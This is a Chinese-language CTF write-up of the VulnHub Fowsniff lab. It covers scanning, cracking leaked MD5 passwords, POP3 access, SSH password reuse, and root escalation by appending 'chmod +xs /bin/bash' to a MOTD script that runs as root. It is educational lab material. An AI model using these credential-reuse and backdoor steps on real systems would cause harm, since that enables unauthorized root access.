# Fowsniff: 1

2024-6-11 https://www.vulnhub.com/entry/fowsniff-1,262/

difficulty: Beginner

## IP

192.168.5.37

## Scan

Open Port -> 22,80,110,143

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 903566f4c6d295121be8cddeaa4e0323 (RSA)
|   256 539d236734cf0ad55a9a1174bdfdde71 (ECDSA)
|_  256 a28fdbae9e3dc9e6a9ca03b1d71b6683 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER CAPA UIDL RESP-CODES PIPELINING TOP AUTH-RESP-CODE
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: have AUTH=PLAINA0001 more capabilities ID listed SASL-IR ENABLE post-login Pre-login IDLE LITERAL+ OK IMAP4rev1 LOGIN-REFERRALS
```

先看 80 web 服务，使用 gobuster 先进行下扫描：

```
gobuster -t 32 dir -u http://192.168.5.37/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html,rar,zip,sql -e

```

http://192.168.5.37/security.txt 显示:

```
Fowsniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!
```

其他的都没找到信息，主页上说@fowsniffcorp Twitter 被控制了，攻击者可能会通过此媒介发布敏感信息，去 twitter 看看有没有敏感信息发布出来，发现有提示：

```
For more information, see the explanation - https://pastebin.com/378rLnGi

Fowsniff is a fictional company, and all tweets, "passwords", users, hostnames, pastess and "emails" are entirely fictional.

- These materials are is part of a Capture the Flag educational challenge created by @berzerk0 on twitter.
  ALL MATERIAL REGARDING FOWSNIFF IS FICTIONAL.

-All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.

- Any similarities to actual people or entities is purely coincidental and occurred accidentally.

Backups of the "password dump" can be found here:
- https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt
- https://web.archive.org/web/20200920053052/https://pastebin.com/NrAqVeeX
```

发现密码转储在 https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt 和 https://web.archive.org/web/20200920053052/https://pastebin.com/NrAqVeeX

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!

Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!

MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P

l8r n00bz!

B1gN1nj4
```

提示了上面的密码是 pop3 的账号和密码，需要先把 md5 进行解密：

```
mauer@fowsniff:mailcall
mustikka@fowsniff:bilbo101
tegel@fowsniff:apples01
baksteen@fowsniff:skyler22
seina@fowsniff:scoobydoo2
stone@fowsniff:
mursten@fowsniff:carp4ever
parede@fowsniff:orlando12
sciana@fowsniff:07011972
```

得到了一些 pop3 账号，尝试登陆看看能否得到可利用信息。

seina@fowsniff:scoobydoo2 能登录，list 有 2 封邮件，retr 看看都是什么内容，

retr 1 得到重要提示: The temporary password for SSH is "S1ck3nBluff+secureshell"

使用这个密码去撞上面得到的几个用户的 ssh，看看哪些用户的默认密码还没有更改，发现一个用户可以登陆：

```
[22][ssh] host: 192.168.5.37   login: baksteen   password: S1ck3nBluff+secureshell
```

使用 ssh 进行登陆，进行系统枚举，sudo 、suid、crontab、getcap 等都没发现可利用点。

发现了一个额外的 cube.sh 文件：/opt/cube/cube.sh

查看文件的内容，和 ssh 登陆时显示的内容一致，应该是在 motd 中引用了这个 ssh，进行验证读取 00-herader 文件：

```
baksteen@fowsniff:/etc/update-motd.d$ cat /etc/update-motd.d/00-header

sh /opt/cube/cube.sh
```

同时 /opt/cube/cube.sh 对 seina 有写权限，可以将后门代码写入到其中，再次登陆 ssh 时，就会触发:

```
echo 'chmod +xs /bin/bash' >> /opt/cube/cube.sh
```

然后再次 ssh 登陆，就能看到/bin/bash 已经有 suid 权限了：

```
-bash-4.3$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
-bash-4.3$ /bin/bash -p
bash-4.3# id
uid=1004(baksteen) gid=100(users) euid=0(root) egid=0(root) groups=0(root),100(users),1001(baksteen)
bash-4.3# cd /root
bash-4.3# ls
flag.txt  Maildir
bash-4.3# cat flag.txt
   ___                        _        _      _   _             _
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
```
